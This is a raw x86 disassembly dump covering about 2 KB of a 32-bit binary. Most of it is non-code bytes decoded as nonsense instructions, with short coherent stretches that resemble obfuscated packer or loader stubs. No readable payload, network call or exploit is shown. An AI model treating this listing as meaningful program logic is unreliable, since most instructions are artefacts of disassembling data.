  41199c:	scas   eax,DWORD PTR es:[edi]
  41199d:	and    eax,0xf51c5085
  4119a2:	mov    dl,0x50
  4119a4:	sbb    cl,BYTE PTR [ecx+0x36]
  4119a7:	jmp    0xf938:0x80afee29
  4119ae:	bnd ja 0x411a08
  4119b1:	mov    edi,edi
  4119b3:	arpl   WORD PTR [ecx+eiz*2-0x4b],bx
  4119b7:	nop
  4119b8:	add    eax,0x57419880
  4119bd:	push   esi
  4119be:	jl     0x411a12
  4119c0:	mov    dl,0x61
  4119c2:	imul   ecx,DWORD PTR [edx],0xbf600d77
  4119c8:	inc    ebx
  4119c9:	clc    
  4119ca:	dec    ecx
  4119cb:	shl    DWORD PTR [edx-0x6d2b8494],0x1f
  4119d2:	sti    
  4119d3:	div    DWORD PTR [edi+0x205f31bf]
  4119d9:	imul   ebx,DWORD PTR [esp+eax*2],0x1a
  4119dd:	jo     0x4119c4
  4119df:	mov    ds:0x3227297b,al
  4119e4:	lahf   
  4119e5:	or     eax,0x74bf96c
  4119ea:	mov    cl,0x2e
  4119ed:	retf   
  4119ee:	fcomip st,st(0)
  4119f0:	push   ds
  4119f1:	sbb    DWORD PTR ds:0xcc6030f,esi
  4119f7:	push   esp
  4119f8:	imul   ebp,DWORD PTR [ebp+0x42eae3b2],0x1e
  4119ff:	adc    BYTE PTR [ebp+0x73],ch
  411a02:	scas   al,BYTE PTR es:[edi]
  411a03:	pop    eax
  411a04:	(bad)  
  411a05:	ins    BYTE PTR es:[edi],dx
  411a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a07:	adc    al,0xcf
  411a09:	(bad)  
  411a0b:	jecxz  0x4119d6
  411a0d:	push   0x8be46ffe
  411a12:	push   ecx
  411a13:	(bad)  
  411a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a15:	fsubr  QWORD PTR [ecx]
  411a17:	adc    esp,esp
  411a19:	xor    al,bl
  411a1b:	fidiv  DWORD PTR [eax+0x61505b46]
  411a21:	dec    edi
  411a22:	loopne 0x411a4d
  411a24:	dec    ebp
  411a25:	stos   BYTE PTR es:[edi],al
  411a26:	push   DWORD PTR [eax-0x21954905]
  411a2c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  411a2e:	xchg   DWORD PTR [edx+0x122f5ae0],edx
  411a34:	fbld   TBYTE PTR [esi-0x26c0d0e2]
  411a3a:	mov    ds:0xd006534,al
  411a3f:	pop    ecx
  411a40:	and    al,0xbf
  411a42:	pusha  
  411a43:	cmp    edi,DWORD PTR [ebp-0x52b43f65]
  411a49:	ss inc esp
  411a4b:	fisub  WORD PTR [eax+0x35dd8425]
  411a51:	cmp    dh,BYTE PTR [esi+0x53cc1b74]
  411a57:	jo     0x411a93
  411a59:	adc    bh,BYTE PTR [edi+0x57]
  411a5c:	fidivr DWORD PTR [eax+0x8]
  411a5f:	test   al,0x51
  411a61:	leave  
  411a62:	gs mov eax,0x92b90f2e
  411a68:	ja     0x411a43
  411a6a:	jp     0x411ade
  411a6c:	ins    BYTE PTR es:[edi],dx
  411a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a6e:	xchg   ebp,eax
  411a6f:	push   ebx
  411a70:	int    0x4e
  411a72:	sub    al,BYTE PTR [ebp-0x191e9801]
  411a78:	scas   eax,DWORD PTR es:[edi]
  411a79:	xor    bl,dh
  411a7b:	xchg   ebp,eax
  411a7c:	dec    eax
  411a7d:	adc    eax,0x42f34379
  411a82:	imul   ecx,edi,0xbd32670
  411a88:	jne    0x411ad1
  411a8a:	sbb    al,0x3
  411a8c:	inc    ebp
  411a8d:	sub    al,0x8f
  411a8f:	or     edx,DWORD PTR [ebx-0x524521e5]
  411a95:	je     0x411b13
  411a97:	sar    BYTE PTR [edi+0x252d0edb],cl
  411a9d:	pop    ds
  411a9e:	inc    edx
  411a9f:	xchg   esi,eax
  411aa0:	xchg   esi,eax
  411aa1:	pop    ds
  411aa2:	mov    bl,0xd5
  411aa4:	(bad)  
  411aa6:	leave  
  411aa7:	loopne 0x411ab6
  411aa9:	jmp    0x3538:0xf9274de4
  411ab0:	xor    dl,0xf6
  411ab3:	pusha  
  411ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ab5:	daa    
  411ab6:	sbb    DWORD PTR [ebp+0x1ba8a7ab],ebp
  411abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411abd:	dec    ebp
  411abe:	mov    ebp,0xbebbfb0f
  411ac3:	out    0xf2,al
  411ac5:	retf   
  411ac6:	inc    esi
  411ac7:	scas   eax,DWORD PTR es:[edi]
  411ac8:	mov    ds:0x949c2c1f,al
  411acd:	add    eax,0xe608dd31
  411ad2:	or     DWORD PTR [esp+ebx*1],esp
  411ad5:	dec    edi
  411ad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ad7:	or     eax,0xf64e8520
  411adc:	dec    ecx
  411add:	in     al,0xb1
  411adf:	cdq    
  411ae0:	xor    al,0x8a
  411ae2:	shl    BYTE PTR [edi+0x5c],1
  411ae5:	das    
  411ae6:	mov    al,ds:0x3712054f
  411aeb:	pop    esi
  411aec:	inc    ebx
  411aed:	xchg   WORD PTR [esi],dx
  411af0:	and    al,0xb
  411af2:	je     0x411ade
  411af4:	fst    DWORD PTR [eax-0x715114ac]
  411afa:	(bad)  
  411afb:	popf   
  411afc:	push   edi
  411afd:	mov    ebx,0x5745374a
  411b02:	imul   ebp,ebp,0x9739edbc
  411b08:	addr16 cwde 
  411b0a:	in     eax,0x2b
  411b0c:	data16 out 0x53,al
  411b0f:	mov    esi,DWORD PTR [ebp-0x76a1ed9a]
  411b15:	mov    ds:0xff0bec7d,al
  411b1a:	ret    
  411b1b:	sbb    eax,0x9d4e39f1
  411b20:	jae    0x411b95
  411b22:	fld    QWORD PTR ds:0xa716ac13
  411b28:	or     DWORD PTR [esi+ebx*1-0x2ca55a1f],ecx
  411b2f:	arpl   WORD PTR [esi],di
  411b31:	mov    eax,ds:0x34c9d5e0
  411b36:	add    eax,eax
  411b38:	mov    ecx,0x5f29ec73
  411b3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b3e:	pushf  
  411b3f:	or     DWORD PTR [ebp+0x769859ae],ebp
  411b45:	adc    al,0xcb
  411b47:	(bad)  
  411b48:	outs   dx,BYTE PTR ds:[esi]
  411b49:	push   eax
  411b4a:	and    esi,DWORD PTR ds:0x9413e9f
  411b50:	pop    edi
  411b51:	xchg   ebp,eax
  411b52:	jne    0x411ba4
  411b54:	sbb    al,0x74
  411b56:	sub    dh,BYTE PTR [edi-0xe]
  411b59:	sbb    DWORD PTR [ebp-0x71],ebx
  411b5c:	outs   dx,BYTE PTR ds:[esi]
  411b5d:	cmovb  esi,edx
  411b60:	sbb    al,0xd1
  411b62:	mov    ebp,0x31c12b43
  411b67:	sub    eax,0x70f1616d
  411b6c:	ins    BYTE PTR es:[edi],dx
  411b6d:	(bad)  
  411b6e:	jnp    0x411b2b
  411b70:	adc    BYTE PTR ds:0x5de9346f,al
  411b76:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b78:	xchg   ebx,eax
  411b79:	mov    eax,0x2ea7d1fa
  411b7e:	add    eax,0x9c47a116
  411b83:	fdiv   QWORD PTR [ecx+esi*8-0x27e30212]
  411b8a:	outs   dx,DWORD PTR ds:[esi]
  411b8b:	aad    0xb6
  411b8d:	lods   al,BYTE PTR ds:[esi]
  411b8e:	xlat   BYTE PTR ds:[ebx]
  411b8f:	(bad)  
  411b90:	xlat   BYTE PTR ds:[ebx]
  411b91:	mov    ah,BYTE PTR [ecx+0x19173992]
  411b97:	xchg   ch,bh
  411b99:	aad    0x72
  411b9b:	push   ss
  411b9c:	in     al,dx
  411b9d:	retf   
  411b9e:	ja     0x411b8a
  411ba0:	rol    DWORD PTR [esi+esi*8],cl
  411ba3:	cmp    ebp,edx
  411ba5:	cli    
  411ba6:	cwde   
  411ba7:	pop    ds
  411ba8:	mov    cl,0x10
  411baa:	imul   esp,DWORD PTR [eax+0x6c396087],0x2345d7f9
  411bb4:	add    BYTE PTR [ecx],0xd7
  411bb7:	mov    dl,cl
  411bb9:	imul   edx,DWORD PTR [edx],0x78
  411bbc:	cmp    DWORD PTR [edi+edi*1],eax
  411bbf:	iret   
  411bc0:	ss push eax
  411bc2:	push   eax
  411bc3:	(bad)  
  411bc4:	pmulhw mm6,mm0
  411bc7:	sar    DWORD PTR [ebx+ebp*2-0x5e921022],cl
  411bce:	jecxz  0x411bdd
  411bd0:	jmp    0xd5c1:0x264d8f52
  411bd7:	jg     0x411b7c
  411bd9:	dec    ecx
  411bda:	leave  
  411bdb:	sbb    al,0x1
  411bdd:	neg    ah
  411bdf:	popa   
  411be0:	xchg   esi,eax
  411be1:	pop    es
  411be2:	xor    esp,esp
  411be4:	rcl    BYTE PTR [esi],0xdf
  411be7:	dec    esi
  411be8:	adc    al,0xd3
  411bea:	repz xchg ebx,eax
  411bec:	repnz push cs
  411bee:	xor    BYTE PTR [edi-0x1cfbaa31],0xaf
  411bf5:	or     ch,BYTE PTR [eax+0x5e]
  411bf8:	seto   BYTE PTR [edx]
  411bfb:	jne    0x411bbd
  411bfd:	adc    BYTE PTR [ecx+0x5b],cl
  411c00:	test   cl,0x58
  411c03:	mov    dl,0x22
  411c05:	push   eax
  411c06:	push   edx
  411c07:	mov    dl,0x30
  411c09:	mov    ds:0xaf9e1f33,al
  411c0e:	pop    edx
  411c0f:	dec    ebx
  411c10:	adc    bh,bh
  411c12:	cwde   
  411c13:	push   ds
  411c14:	call   0x747a:0x23ab660b
  411c1b:	das    
  411c1c:	hlt    
  411c1d:	mov    cl,0xa6
  411c1f:	test   BYTE PTR [ecx+0x6933a809],dl
  411c25:	pop    ss
  411c26:	jecxz  0x411bc5
  411c28:	int3   
  411c29:	sub    esp,DWORD PTR [edx-0x43]
  411c2c:	and    cl,BYTE PTR [ecx-0x16f43aa7]
  411c32:	mov    WORD PTR [edx+0x40],es
  411c35:	sahf   
  411c36:	or     ah,BYTE PTR [ebx+0x6]
  411c39:	retf   
  411c3a:	or     ecx,ebx
  411c3c:	scas   eax,DWORD PTR es:[edi]
  411c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c3e:	icebp  
  411c3f:	mov    eax,0xf07a7974
  411c44:	add    DWORD PTR [edx-0x251d30ca],ebx
  411c4a:	push   0x3b8abe03
  411c4f:	scas   al,BYTE PTR es:[edi]
  411c50:	jns    0x411c21
  411c52:	scas   eax,DWORD PTR es:[edi]
  411c53:	xor    DWORD PTR [edi],0xc3b440b0
  411c59:	jo     0x411c95
  411c5b:	shl    DWORD PTR [ebx-0x21ac5de9],1
  411c61:	fisubr DWORD PTR [eax+edi*1+0x5c436698]
  411c68:	dec    esi
  411c69:	cmp    dl,0xd7
  411c6c:	dec    esp
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xe9bee45e
  411cb8:	mov    BYTE PTR [esi+0x53],bl
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411c63
  411cc2:	push   edx
  411cc3:	jno    0x411c6d
  411cc5:	(bad)  
  411cc7:	scas   eax,DWORD PTR es:[edi]
  411cc8:	test   eax,0xec15b918
  411ccd:	aas    
  411cce:	pop    DWORD PTR [edx-0x55]
  411cd1:	cmp    dh,bl
  411cd3:	push   edx
  411cd4:	push   eax
  411cd5:	cmp    dl,BYTE PTR [eax-0x197bcd]
  411cdb:	leave  
  411cdc:	ins    DWORD PTR es:[edi],dx
  411cdd:	mov    ebp,0x5e9df0a3
  411ce2:	inc    edi
  411ce3:	add    ah,BYTE PTR [bx]
  411ce6:	lahf   
  411ce7:	and    BYTE PTR [edi-0x363bae6b],bh
  411ced:	inc    edx
  411cee:	neg    esp
  411cf0:	(bad)
  411cf3:	pop    eax
  411cf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cf5:	fdiv   st(4),st
  411cf7:	fdivr  QWORD PTR [ebx-0x3e]
  411cfa:	push   es
  411cfb:	jnp    0x411d2c
  411cfd:	fidiv  WORD PTR [ebp-0x1e8551ae]
  411d03:	retf   
  411d04:	xchg   esp,eax
  411d05:	test   bl,dh
  411d07:	dec    esi
  411d08:	xchg   edi,eax
  411d09:	js     0x411ce2
  411d0b:	dec    eax
  411d0c:	jmp    0xf84a:0x7a0f53a
  411d13:	jecxz  0x411cfd
  411d15:	mov    DWORD PTR [ebx+0x257eb20f],ecx
  411d1b:	test   al,0xd9
  411d1d:	pop    eax
  411d1e:	pushf  
  411d1f:	in     eax,dx
  411d20:	hlt    
  411d21:	sub    DWORD PTR [ebx-0x68e0b2fb],ecx
  411d27:	and    ch,dl
  411d29:	es mov ecx,0x318908ad
  411d2f:	ss jmp 0x411cd0
  411d32:	mov    cl,0xb
  411d34:	dec    esp
  411d35:	mov    al,0xaf
  411d37:	fild   QWORD PTR [esi+esi*2]
  411d3a:	adc    al,0xc5
  411d3c:	push   eax
  411d3d:	mov    cl,dl
  411d3f:	js     0x411d2e
  411d41:	jo     0x411d51
  411d43:	inc    ebx
  411d44:	into   
  411d45:	add    DWORD PTR [ecx+ebp*1],esp
  411d48:	pop    ss
  411d49:	inc    esp
  411d4a:	xor    dl,0xa3
  411d4d:	rcl    BYTE PTR [esi],0xba
  411d50:	fdiv   st(1),st
  411d52:	jae    0x411d38
  411d54:	pushf  
  411d55:	and    eax,0x904ddc0f
  411d5a:	cmp    edi,edi
  411d5c:	cmp    BYTE PTR [edi],dl
  411d5e:	cmp    ebx,DWORD PTR [esi]
  411d60:	or     eax,0xd361c06b
  411d65:	push   es
  411d66:	cmp    eax,DWORD PTR [edx-0xa05dff0]
  411d6c:	shl    DWORD PTR ds:0x70b28055,1
  411d72:	add    al,0xc8
  411d74:	jns    0x411d74
  411d76:	mov    ah,0xbe
  411d78:	mov    ecx,0xc58465b1
  411d7d:	loop   0x411d4b
  411d7f:	inc    ebp
  411d80:	push   cs
  411d81:	pop    es
  411d82:	leave  
  411d83:	idiv   DWORD PTR gs:[ebx+0x3b]
  411d87:	lahf   
  411d88:	fidivr DWORD PTR [esi]
  411d8a:	fdivr  QWORD PTR [eax+0x74]
  411d8d:	add    al,0x5
  411d8f:	mov    WORD PTR [ecx],?
  411d91:	es xor edx,ebp
  411d94:	xchg   esi,eax
  411d95:	sbb    DWORD PTR [eax],edi
  411d97:	jnp    0x411d48
  411d99:	sub    dh,BYTE PTR [eax+0xd96fda9]
  411d9f:	dec    ecx
  411da0:	mov    eax,DWORD PTR [edi+0x31]
  411da3:	fcmovnb st,st(3)
  411da5:	pop    ecx
  411da6:	mov    ds:0xa92a20b0,al
  411dab:	xchg   edx,eax
  411dac:	pop    ebp
  411dad:	mov    al,ds:0xd186e3c2
  411db2:	mov    WORD PTR [ecx+0x63],cs
  411db5:	push   cs
  411db6:	daa    
  411db7:	addr16 mov edx,0x34f23e9
  411dbd:	(bad)  
  411dbf:	ja     0x411d7a
  411dc1:	jne    0x411de0
  411dc3:	jae    0x411dcf
  411dc5:	(bad)  [ecx+0x8279799]
  411dcb:	sar    ah,1
  411dcd:	pop    ds
  411dce:	inc    ebx
  411dcf:	int3   
  411dd0:	jae    0x411da4
  411dd2:	aam    0xb7
  411dd4:	xchg   ecx,eax
  411dd6:	push   esp
  411dd7:	push   0x715026f
  411ddc:	call   0x948e5a7
  411de1:	adc    eax,0x7adf51f0
  411de6:	sbb    DWORD PTR [ecx+0x77],esp
  411de9:	mov    edx,DWORD PTR [ebx-0x4e2b876f]
  411def:	test   BYTE PTR [eax-0x23],dh
  411df2:	cmp    ebx,DWORD PTR [edx+0x31c0661b]
  411df8:	repnz icebp 
  411dfa:	adc    dl,BYTE PTR [edi+eiz*4+0x54]
  411dfe:	test   BYTE PTR [edi-0x23],cl
  411e01:	add    al,0xb3
  411e03:	shl    DWORD PTR [edi-0x80],0x90
  411e07:	inc    eax
  411e08:	inc    ecx
  411e09:	mov    al,ds:0x94e676f5
  411e0e:	xchg   edx,eax
  411e0f:	call   FWORD PTR [ebx-0x19]
  411e12:	mov    ch,bh
  411e14:	jb     0x411db7
  411e16:	sti    
  411e17:	add    ecx,DWORD PTR ds:0x7936cc44
  411e1d:	sbb    DWORD PTR [edx+0x7f],ebp
  411e20:	xchg   ebp,eax
  411e21:	arpl   WORD PTR [esi-0x60a3979f],bp
  411e27:	out    0x1,eax
  411e29:	cmp    esi,DWORD PTR [eax-0x1d]
  411e2c:	pop    ebx
  411e2d:	dec    ecx
  411e2e:	(bad)  
  411e2f:	jae    0x411e2f
  411e31:	inc    ebp
  411e32:	es jge 0x411dc5
  411e35:	outs   dx,BYTE PTR ds:[esi]
  411e36:	dec    ecx
  411e37:	je     0x411e72
  411e39:	jmp    0x411e67
  411e3b:	sbb    al,0x50
  411e3d:	pop    ebp
  411e3e:	(bad)  
  411e40:	or     ebx,DWORD PTR [ecx]
  411e42:	cmp    ch,ch
  411e44:	cs hlt 
  411e46:	sbb    BYTE PTR [eax],dl
  411e48:	jmp    0xc1ac:0x820dcc21
  411e4f:	push   0x606be58f
  411e54:	dec    ebp
  411e55:	imul   ebx,ebx,0x5a
  411e58:	loope  0x411ed0
  411e5a:	out    dx,eax
  411e5b:	mov    esp,0x7c3a57bf
  411e60:	push   0xe9a14a82
  411e65:	outs   dx,DWORD PTR ds:[esi]
  411e66:	push   eax
  411e67:	cwde   
  411e68:	and    eax,0x7f7c41cf
  411e6d:	aad    0x23
  411e6f:	mov    ebx,0x3c941010
  411e74:	pop    edi
  411e75:	dec    esp
  411e76:	jp     0x411ebf
  411e78:	daa    
  411e79:	loopne 0x411e18
  411e7b:	call   0x77df:0x24ea899b
  411e82:	jmp    0x411ec1
  411e84:	cwde   
  411e85:	adc    BYTE PTR [ebp+0x36b8b52d],cl
  411e8b:	loop   0x411e28
  411e8d:	mov    ds:0x90d4b3c6,al
  411e92:	mov    ebx,0x93427add
  411e97:	xchg   ebx,eax
  411e98:	sbb    esi,DWORD PTR [edi+edx*2-0x1ee07cd2]
  411e9f:	stos   DWORD PTR es:[edi],eax
  411ea0:	or     ecx,edi
  411ea2:	mov    ds:0x36d3b0dc,eax
  411ea7:	cmp    ebx,esp
  411ea9:	jne    0x411e7a
  411eab:	pop    ss
  411eac:	lods   al,BYTE PTR ds:[esi]
  411ead:	int    0xf4
  411eaf:	and    BYTE PTR [ebp+0xd],0xd4
  411eb3:	aas    
  411eb4:	and    BYTE PTR [eax-0x3f],bl
  411eb7:	xlat   BYTE PTR ds:[ebx]
  411eb8:	pop    ecx
  411eb9:	repz add DWORD PTR [edi-0x18],esp
  411ebd:	push   esp
  411ebe:	jg     0x411eeb
  411ec0:	xchg   edx,eax
  411ec1:	add    dl,BYTE PTR [esp+esi*2-0x36d0fa56]
  411ec8:	mov    cl,0xeb
  411eca:	dec    bh
  411ecc:	pop    edx
  411ecd:	sbb    eax,0xdae84b95
  411ed2:	fdivr  st,st(7)
  411ed4:	adc    DWORD PTR [ebp-0x3c351436],ecx
  411eda:	xchg   edi,eax
  411edb:	sbb    eax,0x83389b15
  411ee0:	push   ebx
  411ee1:	sahf   
  411ee2:	lods   al,BYTE PTR ds:[esi]
  411ee3:	out    0xab,al
  411ee5:	idiv   DWORD PTR [ecx+0x79]
  411ee8:	jns    0x411e74
  411eea:	cli    
  411eeb:	pop    esp
  411eec:	mov    ebx,0x7dcaff2
  411ef1:	lods   al,BYTE PTR cs:[esi]
  411ef3:	cmp    eax,ebp
  411ef5:	mov    ds:0xf171b02a,al
  411efa:	mov    ebx,0x6cde3a75
  411eff:	push   ecx
  411f00:	(bad)  
  411f01:	je     0x411eb0
  411f03:	or     dh,BYTE PTR [ebp+0x0]
  411f06:	inc    ecx
  411f07:	fmulp  st(7),st
  411f09:	fcomp  DWORD PTR [edx+edx*8]
  411f0c:	mov    cl,0xe7
  411f0e:	adc    BYTE PTR [eax],0xac
  411f11:	and    al,0x42
  411f13:	jp     0x411f49
  411f15:	mov    ch,BYTE PTR [eax+0x6a37978f]
  411f1b:	and    eax,0x780e900a
  411f20:	bound  ebx,QWORD PTR [edi]
  411f22:	or     al,0xd9
  411f24:	mov    al,0x7d
  411f26:	inc    ebx
  411f27:	into   
  411f28:	pop    edx
  411f29:	xor    al,0xff
  411f2b:	adc    BYTE PTR [eax],dl
  411f2d:	or     al,0xcd
  411f2f:	jmp    0x411f01
  411f31:	in     al,0x92
  411f33:	fst    QWORD PTR [edx+0x3a04dacd]
  411f39:	mov    esp,0x48bf799e
  411f3e:	push   ebp
  411f3f:	addr16 out 0xcd,al
  411f42:	hlt    
  411f43:	dec    si
  411f45:	sub    al,0x30
  411f47:	push   ds
  411f48:	data16 or BYTE PTR [eax-0x7],ch
  411f4c:	not    DWORD PTR [esi+0x7145618]
  411f52:	jae    0x411f6b
  411f54:	mov    edi,0xf898cba5
  411f59:	pop    esp
  411f5a:	js     0x411ee9
  411f5c:	pop    eax
  411f5d:	cwde   
  411f5e:	dec    ebx
  411f5f:	lea    ecx,[edi-0x60cc8c76]
  411f65:	je     0x411f31
  411f67:	gs in  al,0x8c
  411f6a:	jg     0x411f21
  411f6c:	out    dx,eax
  411f6d:	in     al,dx
  411f6e:	xchg   DWORD PTR [edi+0x2a],ebx
  411f71:	or     edx,DWORD PTR [edx]
  411f73:	jge    0x411fce
  411f75:	loope  0x411f1e
  411f77:	bound  esi,QWORD PTR [edx]
  411f79:	mov    ah,0xd5
  411f7b:	(bad)  
  411f7e:	retf   
  411f7f:	mov    dl,0x86
  411f81:	adc    BYTE PTR [esi],bh
  411f83:	out    dx,eax
  411f84:	call   0x5140:0x9e4e63ab
  411f8b:	mov    ebp,ebx
  411f8d:	pusha  
  411f8e:	out    0x6c,al
  411f90:	rol    BYTE PTR [ebx+0x1f9440b3],0x66
  411f97:	push   ax
  411f99:	sub    ebp,DWORD PTR [ebx-0x25c4b7d]
  411f9f:	add    eax,0xd54512e4
  411fa4:	xchg   esp,eax
  411fa5:	jmp    0x2f05:0xa181da30
  411fac:	dec    eax
  411fad:	loopne 0x411f64
  411faf:	sub    BYTE PTR [ecx+edx*2+0x5da1a1b3],bl
  411fb6:	stc    
  411fb7:	and    BYTE PTR [edi],0x6e
  411fba:	clc    
  411fbb:	sbb    BYTE PTR [edx+edx*4-0x2],ah
  411fbf:	push   ebp
  411fc0:	cld    
  411fc1:	jns    0x411f72
  411fc3:	js     0x411f5f
  411fc5:	xchg   DWORD PTR [esi+edx*4-0x37263619],edx
  411fcc:	ret    0x8d18
  411fcf:	mov    dh,BYTE PTR [ecx+0x2c5525de]
  411fd5:	sub    dl,BYTE PTR [esi-0x6d]
  411fd8:	cmp    dl,BYTE PTR [ecx-0x2b]
  411fdb:	sbb    BYTE PTR [ebp+0x75],al
  411fde:	sbb    ah,BYTE PTR [ecx-0x2c]
  411fe1:	ins    DWORD PTR es:[di],dx
  411fe3:	pop    ss
  411fe4:	dec    edx
  411fe5:	mov    ebx,0x196fac8f
  411fea:	push   0x776f5419
  411fef:	call   0x48ececab
  411ff4:	ss jbe 0x411ff7
  411ff7:	aas    
  411ff8:	ds inc ecx
  411ffa:	add    cl,BYTE PTR [esi-0x49]
  411ffd:	dec    edi
  411ffe:	sub    DWORD PTR [ecx-0x6c],esi
  412001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412002:	test   esp,ebx
  412004:	enter  0xadb6,0x23
  412008:	outs   dx,DWORD PTR ds:[esi]
  412009:	into   
  41200a:	sahf   
  41200b:	jmp    0x411ff0
  41200d:	add    ah,BYTE PTR [esi+eiz*1+0x26]
  412011:	imul   esi
  412013:	xor    eax,0x73965acd
  412018:	or     ebx,edi
  41201a:	fwait
  41201b:	mov    dh,0x89
  41201d:	cmp    ebx,DWORD PTR [esi]
  41201f:	out    dx,eax
  412020:	les    ebp,FWORD PTR cs:[ebx+0x69]
  412024:	jl     0x412042
  412026:	add    ecx,DWORD PTR [esp+ebx*8]
  412029:	ret    0x445d
  41202c:	xor    al,0xf8
  41202e:	jg     0x412017
  412030:	stc    
  412031:	sbb    esi,DWORD PTR [esi-0x2f48067f]
  412037:	ror    DWORD PTR [edi+eiz*4-0x6d],1
  41203b:	in     al,dx
  41203c:	mov    al,0x5
  41203e:	stc    
  41203f:	push   ecx
  412040:	adc    ah,cl
  412042:	or     BYTE PTR [edi],dh
  412044:	popf   
  412045:	out    0x13,eax
  412047:	jp     0x411fca
  412049:	pop    esp
  41204a:	xchg   esp,eax
  41204b:	mov    al,ds:0x89a3234e
  412050:	jecxz  0x411ffc
  412052:	stos   DWORD PTR es:[edi],eax
  412053:	ins    BYTE PTR es:[edi],dx
  412054:	cmp    eax,0xe451d4de
  412059:	test   BYTE PTR [ecx+0x7999e003],al
  41205f:	test   BYTE PTR [edx],dh
  412061:	mov    eax,0xdaa8d8f3
  412066:	jns    0x4120bd
  412068:	repz lock jbe 0x4120c8
  41206c:	jmp    0x412099
  41206e:	aam    0x4e
  412070:	mov    WORD PTR [eax+0x61019bf5],ss
  412076:	lods   eax,DWORD PTR ds:[esi]
  412077:	pop    edx
  412078:	jg     0x4120b4
  41207a:	pushf  
  41207b:	jecxz  0x41200d
  41207d:	mov    dh,0xd5
  41207f:	mov    esi,0x8d4a7249
  412084:	shl    DWORD PTR [ecx+0x75],0x84
  412088:	inc    eax
  412089:	push   edi
  41208a:	int3   
  41208b:	(bad)  
  41208c:	fidivr DWORD PTR [eax-0x47b2b207]
  412092:	mov    ds:0x68ab38ac,eax
  412097:	mov    eax,ds:0x71d5eb0
  41209c:	scas   eax,DWORD PTR es:[edi]
  41209d:	iret   
  41209e:	jns    0x412030
  4120a0:	push   eax
  4120a1:	or     BYTE PTR [esi-0x9],bl
  4120a4:	je     0x41208b
  4120a6:	pop    esp
  4120a7:	leave  
  4120a8:	xchg   BYTE PTR [ebx+0x8b0845],cl
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	push   0x46e317ac
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x5b70707e
  41217a:	jge    0x412182
  41217c:	fimul  WORD PTR ds:0xca931194
  412182:	ins    BYTE PTR es:[edi],dx
  412183:	cmp    BYTE PTR [ebp-0x5818ee1a],cl
  412189:	or     BYTE PTR [edi-0x4e],0x1
  41218d:	cmp    eax,0xd8ce4c32
  412192:	stc    
  412193:	adc    eax,0x56853702
  412198:	popf   
  412199:	push   ebp
  41219a:	mov    edi,0x71ee4260
  41219f:	mov    ecx,es
  4121a1:	jns    0x4121b2
  4121a3:	imul   edi,DWORD PTR [ebp+0x6a],0xac5cd32
  4121aa:	rcl    ebp,cl
  4121ac:	in     eax,dx
  4121ad:	jmp    0x412190
  4121af:	inc    esp
  4121b0:	jns    0x412137
  4121b2:	lahf   
  4121b3:	pop    edx
  4121b4:	mov    WORD PTR [ebx-0x1f],cs
  4121b7:	jb     0x4121e0
  4121b9:	cmp    al,0x97
  4121bb:	in     al,dx
  4121bc:	(bad)  
  4121bd:	fisub  WORD PTR [ecx+0x6b]
  4121c0:	jns    0x412241
  4121c2:	cmp    DWORD PTR [edi+esi*1-0x9f59123],ebp
  4121c9:	or     BYTE PTR [ebx],dh
  4121cb:	or     eax,0xee5a2a56
